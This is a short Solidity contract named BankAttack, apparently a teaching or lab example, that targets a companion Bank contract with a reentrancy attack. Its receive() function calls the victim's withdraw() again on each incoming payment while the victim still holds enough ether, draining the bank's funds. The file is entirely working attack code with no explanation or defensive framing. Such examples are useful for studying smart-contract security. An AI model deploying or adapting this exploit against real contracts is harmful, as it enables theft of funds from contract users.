//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.28;

import "./Bank.sol";

contract BankAttack {
    
    Bank public victim;
    
    constructor(address addr){      
         victim = Bank(addr);   
    } 
    
    function deposit() payable public{
        victim.deposit{value: msg.value}();
    }
    
    function balance() public view returns(uint256){
        return victim.balance();
    }
    
    function withdraw() public {
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance >= victim.balance()){
            victim.withdraw();
        }
    }

}